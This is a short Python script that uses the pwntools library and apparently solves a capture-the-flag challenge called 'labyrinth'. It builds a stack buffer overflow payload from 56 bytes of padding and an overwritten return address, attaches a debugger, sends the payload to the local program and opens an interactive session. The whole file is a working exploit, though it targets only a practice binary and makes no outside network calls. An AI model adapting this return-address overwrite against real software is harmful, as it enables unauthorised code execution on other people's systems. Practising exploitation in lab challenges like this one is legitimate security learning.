from pwn import *

# Set up the local process
io = process('./labyrinth')

# Define the buffer overflow offset
offset = b'a' * 56

# Address to overwrite the return pointer
addr = p64(0x401255)

# Build the payload
payload = flat(
    offset,
    addr
)

# Write the payload to a file
with open('payload', 'wb') as f:
    f.write(payload)

# Attach GDB to the local process
gdb.attach(io, '''
    b *0x401255
    continue
''')

# Interact with the program
io.sendline(b'69')
io.recvuntil(b'chose?\n\n>>')

# Send the payload
io.sendline(payload)

# Switch to interactive mode to interact with the shell or program
io.interactive()
